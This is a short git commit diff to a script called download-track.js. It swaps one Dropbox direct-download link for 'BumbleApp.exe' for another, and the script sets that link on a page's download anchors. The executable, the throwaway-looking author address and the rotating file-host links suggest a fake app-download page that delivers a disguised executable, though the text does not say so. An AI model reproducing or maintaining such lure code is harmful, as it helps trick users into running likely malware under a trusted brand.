2d6ed00525e3b938b38d02a93220cac99306e950
leckaawicas <tsurpsuraoyeayoeayroaurosueaye@gmail.com>
2026-07-29 21:01:05 +0300

    Update Bumble_APP_DOWNLOAD_URL to new link

--- download-track.js
+++ download-track.js
@@ -1,7 +1,7 @@
 (function (global) {
     "use strict";
 
-    var Bumble_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/ksrwx1akwy93kupc6ghdp/BumbleApp.exe?rlkey=d6tp1rmcgocmiuly5t0gmjw3s&st=i67rmpkn&dl=1";
+    var Bumble_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/yyd11p20ljwkrz19j66r7/BumbleApp.exe?rlkey=dh8l5nhj5yygjztzwtwzz7aia&st=q11dflet&dl=1";
 
     function applyDownloadLinksToAnchors() {
         if (typeof document === "undefined") return;
